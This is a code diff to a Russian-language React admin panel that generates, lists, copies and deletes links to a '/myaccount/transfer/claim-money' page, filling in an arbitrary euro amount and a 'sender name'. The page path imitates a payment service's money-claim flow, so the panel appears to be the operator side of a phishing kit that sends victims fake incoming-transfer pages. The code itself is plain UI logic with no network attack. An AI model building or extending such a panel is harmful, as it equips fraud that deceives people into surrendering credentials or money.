@@ -1,17 +1,41 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { LogOut, Copy, Check } from "lucide-react";
+import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { LogOut, Copy, Check, Trash2, Plus } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+
+interface GeneratedLink {
+  id: string;
+  price: string;
+  name: string;
+  link: string;
+  contextData: string;
+  createdAt: string;
+}
 
 export const AdminPanel = (): JSX.Element => {
   const [price, setPrice] = useState("");
   const [name, setName] = useState("");
-  const [generatedLink, setGeneratedLink] = useState("");
-  const [copied, setCopied] = useState(false);
+  const [generatedLinks, setGeneratedLinks] = useState<GeneratedLink[]>([]);
+  const [copied, setCopied] = useState<string | null>(null);
   const { toast } = useToast();
+
+  // Load links from localStorage on component mount
+  useEffect(() => {
+    const savedLinks = localStorage.getItem('generatedLinks');
+    if (savedLinks) {
+      setGeneratedLinks(JSON.parse(savedLinks));
+    }
+  }, []);
+
+  // Save links to localStorage whenever links change
+  useEffect(() => {
+    localStorage.setItem('generatedLinks', JSON.stringify(generatedLinks));
+  }, [generatedLinks]);
 
   const generateRandomString = () => {
     const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
@@ -35,19 +59,35 @@ export const AdminPanel = (): JSX.Element => {
     const randomString = generateRandomString();
     const baseUrl = window.location.origin;
     const link = `${baseUrl}/myaccount/transfer/claim-money?context_data=${randomString}&price=${encodeURIComponent(price)}&name=${encodeURIComponent(name)}`;
-    setGeneratedLink(link);
-    setCopied(false);
+    
+    const newLink: GeneratedLink = {
+      id: Date.now().toString(),
+      price,
+      name,
+      link,
+      contextData: randomString,
+      createdAt: new Date().toLocaleString('ru-RU'),
+    };
+
+    setGeneratedLinks(prev => [newLink, ...prev]);
+    setPrice("");
+    setName("");
+    
+    toast({
+      title: "Ссылка создана!",
+      description: "Новая ссылка добавлена в список",
+    });
   };
 
-  const copyToClipboard = async () => {
+  const copyToClipboard = async (linkToCopy: string, linkId: string) => {
     try {
-      await navigator.clipboard.writeText(generatedLink);
-      setCopied(true);
+      await navigator.clipboard.writeText(linkToCopy);
+      setCopied(linkId);
       toast({
         title: "Скопировано!",
         description: "Ссылка скопирована в буфер обмена",
       });
-      setTimeout(() => setCopied(false), 2000);
+      setTimeout(() => setCopied(null), 2000);
     } catch (err) {
       toast({
         title: "Ошибка",
@@ -55,6 +95,22 @@ export const AdminPanel = (): JSX.Element => {
         variant: "destructive",
       });
     }
+  };
+
+  const deleteLink = (linkId: string) => {
+    setGeneratedLinks(prev => prev.filter(link => link.id !== linkId));
+    toast({
+      title: "Ссылка удалена",
+      description: "Ссылка была удалена из списка",
+    });
+  };
+
+  const deleteAllLinks = () => {
+    setGeneratedLinks([]);
+    toast({
+      title: "Все ссылки удалены",
+      description: "Список ссылок очищен",
+    });
   };
 
   const handleLogout = () => {
@@ -77,62 +133,113 @@ export const AdminPanel = (): JSX.Element => {
           </Button>
         </div>
 
-        {/* Link Generator */}
-        <Card>
-          <CardHeader>
-            <CardTitle>Генератор ссылок</CardTitle>
-          </CardHeader>
-          <CardContent className="space-y-4">
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-              <div className="space-y-2">
-                <Label htmlFor="price">Цена</Label>
-                <Input
-                  id="price"
-                  placeholder="10,00 €"
-                  value={price}
-                  onChange={(e) => setPrice(e.target.value)}
-                />
-              </div>
-              <div className="space-y-2">
-                <Label htmlFor="name">Имя отправителя</Label>
-                <Input
-                  id="name"
-                  placeholder="Иван Иванов"
-                  value={name}
-                  onChange={(e) => setName(e.target.value)}
-                />
-              </div>
-            </div>
+        <Tabs defaultValue="create" className="space-y-6">
+          <TabsList className="grid w-full grid-cols-2">
+            <TabsTrigger value="create">
+              <Plus className="w-4 h-4 mr-2" />
+              Создать ссылку
+            </TabsTrigger>
+            <TabsTrigger value="manage">Управление ссылками</TabsTrigger>
+          </TabsList>
 
-            <Button onClick={generateLink} className="w-full">
-              Сгенерировать ссылку
-            </Button>
-
-            {generatedLink && (
-              <div className="space-y-2">
-                <Label>Сгенерированная ссылка:</Label>
-                <div className="flex gap-2">
-                  <Input
-                    value={generatedLink}
-                    readOnly
-                    className="flex-1 font-mono text-sm"
-                  />
-                  <Button
-                    onClick={copyToClipboard}
-                    variant="outline"
-                    size="sm"
-                    className="px-3"
-                  >
-                    {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
-                  </Button>
+          <TabsContent value="create">
+            <Card>
+              <CardHeader>
+                <CardTitle>Создать новую ссылку</CardTitle>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label htmlFor="price">Цена</Label>
+                    <Input
+                      id="price"
+                      placeholder="10,00 €"
+                      value={price}
+                      onChange={(e) => setPrice(e.target.value)}
+                    />
+                  </div>
+                  <div className="space-y-2">
+                    <Label htmlFor="name">Имя отправителя</Label>
+                    <Input
+                      id="name"
+                      placeholder="Иван Иванов"
+                      value={name}
+                      onChange={(e) => setName(e.target.value)}
+                    />
+                  </div>
                 </div>
-                <p className="text-sm text-gray-600">
-                  При переходе по ссылке плейсхолдеры {"{price}"} и {"{name}"} будут заменены на указанные значения.
-                </p>
-              </div>
-            )}
-          </CardContent>
-        </Card>
+
+                <Button onClick={generateLink} className="w-full">
+                  <Plus className="w-4 h-4 mr-2" />
+                  Создать ссылку
+                </Button>
+              </CardContent>
+            </Card>
+          </TabsContent>
+
+          <TabsContent value="manage">
+            <Card>
+              <CardHeader className="flex flex-row items-center justify-between">
+                <CardTitle>Управление ссылками ({generatedLinks.length})</CardTitle>
+                {generatedLinks.length > 0 && (
+                  <Button 
+                    onClick={deleteAllLinks} 
+                    variant="destructive" 
+                    size="sm"
+                  >
+                    <Trash2 className="w-4 h-4 mr-2" />
+                    Удалить все
+                  </Button>
+                )}
+              </CardHeader>
+              <CardContent>
+                {generatedLinks.length === 0 ? (
+                  <p className="text-center text-gray-500 py-8">
+                    Нет созданных ссылок. Создайте первую ссылку во вкладке "Создать ссылку".
+                  </p>
+                ) : (
+                  <div className="space-y-4">
+                    <Table>
+                      <TableHeader>
+                        <TableRow>
+                          <TableHead>Цена</TableHead>
+                          <TableHead>Имя</TableHead>
+                          <TableHead>Создано</TableHead>
+                          <TableHead>Действия</TableHead>
+                        </TableRow>
+                      </TableHeader>
+                      <TableBody>
+                        {generatedLinks.map((link) => (
+                          <TableRow key={link.id}>
+                            <TableCell className="font-medium">{link.price}</TableCell>
+                            <TableCell>{link.name}</TableCell>
+                            <TableCell className="text-sm text-gray-500">{link.createdAt}</TableCell>
+                            <TableCell className="space-x-2">
+                              <Button
+                                onClick={() => copyToClipboard(link.link, link.id)}
+                                variant="outline"
+                                size="sm"
+                              >
+                                {copied === link.id ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
+                              </Button>
+                              <Button
+                                onClick={() => deleteLink(link.id)}
+                                variant="destructive"
+                                size="sm"
+                              >
+                                <Trash2 className="w-4 h-4" />
+                              </Button>
+                            </TableCell>
+                          </TableRow>
+                        ))}
+                      </TableBody>
+                    </Table>
+                  </div>
+                )}
+              </CardContent>
+            </Card>
+          </TabsContent>
+        </Tabs>
       </div>
     </div>
   );
